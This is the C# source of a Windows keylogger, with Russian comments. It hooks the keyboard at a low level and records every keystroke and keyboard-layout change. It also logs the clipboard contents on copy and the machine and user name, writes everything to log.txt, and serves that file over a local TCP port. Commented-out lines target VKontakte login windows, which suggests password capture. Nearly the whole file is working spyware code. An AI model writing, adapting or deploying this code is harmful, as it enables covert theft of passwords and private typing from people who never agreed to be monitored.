using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics.Metrics;
using System.Runtime.CompilerServices;

namespace ConsoleApplication1
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        public const int KF_REPEAT = 0X40000000;
        public static int _counter = 0;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;



        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);



        public static string? initLayout;
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetAsyncKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout([In] int idThread);

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }

    [STAThread]
        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);

            Writer("MachineName: " + Environment.MachineName + '\n');
            Writer("OSVersion: " + Environment.OSVersion.ToString() + '\n');
            Writer("UserName: " + Environment.UserName + '\n');
            Writer("Date: "+DateTime.Now.ToShortDateString()+'\n');

            string htmlData = GetBuff();


            initLayout = GetKeyboardLayout().ToString();
            Writer("Первоначальная раскладка: " + initLayout + '\n');
            Thread mtr = new Thread(SendFile);
            mtr.Start();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule? curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
            if (nCode >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                bool shift = false;
                var caps = Console.CapsLock;
                short shiftState = GetAsyncKeyState((int)Keys.LShiftKey);
                int vkCode = Marshal.ReadInt32(lParam);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                KeysConverter kc = new KeysConverter();
                string?key = kc.ConvertToString((Keys)vkCode);
                string mss_check = GetKeyboardLayout().ToString();

                if (initLayout != mss_check)
                {
                    Writer("\n<Смена раскладки:" + mss_check + " >\n");
                    initLayout = mss_check;
                }
                if (vkCode > 64 && vkCode < 91)
                {
                    if (shift | caps)
                    {
                        Writer(key);
                    }
                    else
                    {
                        Writer(key.ToLower());
                    }
                }
                else if (vkCode >= 96 && vkCode <= 111)
                {
                    switch (vkCode)
                    {
                        case 96: Writer("0"); break;
                        case 97: Writer("1"); break;
                        case 98: Writer("2"); break;
                        case 99: Writer("3"); break;
                        case 100: Writer("4"); break;
                        case 101: Writer("5"); break;
                        case 102: Writer("6"); break;
                        case 103: Writer("7"); break;
                        case 104: Writer("8"); break;
                        case 105: Writer("9"); break;
                        case 106: Writer("*"); break;
                        case 107: Writer("+"); break;
                        case 108: Writer("|"); break;
                        case 109: Writer("-"); break;
                        case 110: Writer("."); break;
                        case 111: Writer("/"); break;
                    }
                }
                else if ((vkCode >= 48 && vkCode <= 57) || (vkCode >= 186 && vkCode <= 192))
                {
                    if (shift)
                    {
                        switch (vkCode)
                        {
                            case 48: Writer(")"); break;
                            case 49: Writer("!"); break;
                            case 50: Writer("@"); break;
                            case 51: Writer("#"); break;
                            case 52: Writer("$"); break;
                            case 53: Writer("%"); break;
                            case 54: Writer("^"); break;
                            case 55: Writer("&"); break;
                            case 56: Writer("*"); break;
                            case 57: Writer("("); break;
                            case 186: Writer(":"); break;
                            case 187: Writer("+"); break;
                            case 188: Writer("<"); break;
                            case 189: Writer("_"); break;
                            case 190: Writer(">");break;
                            case 191: Writer("?"); break;
                            case 192: Writer("~"); break;
                            case 219: Writer("{");break;
                            case 220: Writer("|"); break;
                            case 221: Writer("}"); break;
                            case 222: Writer("\""); break;
                        }
                    }
                    else
                    {
                        switch (vkCode)
                        {
                            case 48: Writer("0"); break;
                            case 49: Writer("1"); break;
                            case 50: Writer("2"); break;
                            case 51: Writer("3"); break;
                            case 52: Writer("4"); break;
                            case 53: Writer("5"); break;
                            case 54: Writer("6"); break;
                            case 55: Writer("7"); break;
                            case 56: Writer("8"); break;
                            case 57: Writer("9"); break;
                            case 186: Writer(";"); break;
                            case 187: Writer("="); break;
                            case 188: Writer(","); break;
                            case 189: Writer("-"); break;
                            case 190: Writer("."); break;
                            case 191: Writer("/"); break;
                            case 192: Writer("`"); break;
                            case 219: Writer("["); break;
                            case 220: Writer("\\"); break;
                            case 221: Writer("]"); break;
                            case 222: Writer("'"); break;
                        }
                    }

                }
                if ((Keys)vkCode == Keys.Delete)
                    Writer("<Delete>");
                else if ((Keys)vkCode == Keys.Back)
                    Writer("<Backspace>");
                else if ((Keys)vkCode == Keys.Enter)
                    Writer("<Enter>");
                else if ((Keys)vkCode == Keys.Escape)
                    Writer("<Esc>");
                else if ((Keys)vkCode == Keys.Space)
                    Writer("<Space>");




                // ловим сочетание клавиш CTRL+C (копирование в буфер)
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    string htmlData1 = GetBuff();                                                   
                    Writer("Содержимое буфера: " + htmlData1 + "\n");                
                    Writer("\n<COPY>\n");
                }

                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<PASTE>\n");
                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Отмена>\n");
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Искать>\n");
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Выделить всё>\n");
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Новый>\n");
                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Нов.вкладка>\n");
                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    Writer("\n<Вырезать>\n");
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }
        public static async void SendFile()
        {
            IPAddress localAddress = IPAddress.Loopback;
            const int localPort = 7777;
            const string filename = "log.txt";

            var server = new TcpListener(localAddress, localPort);
            server.Start();

            while (true)
            {
                var client = await server.AcceptTcpClientAsync();
                _ = Task.Run(() => Serve(client, filename));
            }
        }
        static async Task Serve(TcpClient client, string filename)
        {
            using var _ = client;
            var stream = client.GetStream();
            using var file = File.OpenRead(filename);
            var length = file.Length;
            byte[] lengthBytes = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(length));
            await stream.WriteAsync(lengthBytes);
            await file.CopyToAsync(stream);
        }
        public static void Writer(string inputstring)
        {
            _counter++;
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            if (inputstring == "<Enter>")
                sw.WriteLine(inputstring + DateTime.Now.ToString(" - [HH:mm:ss]"));
            if (_counter < 101)
                sw.Write(inputstring);
            else 
            {
                sw.Write(inputstring + DateTime.Now.ToString(" - [HH:mm:ss]"));
                _counter = 0;
            }
            sw.Flush();
            sw.Close();
        }

        bool IsForegroundWindowInteresting(String s)
        {
            IntPtr _hwnd = GetForegroundWindow();
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(_hwnd, sb, sb.Capacity);
            if (sb.ToString().ToUpperInvariant().Contains(s.ToUpperInvariant())) return true;
            return false;
        }


                    //if (IsForegroundWindowInteresting("Welcome! | VK") ||
                    //IsForegroundWindowInteresting("Добро пожаловать | ВКонтакте"))

                    //return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
    }






}
}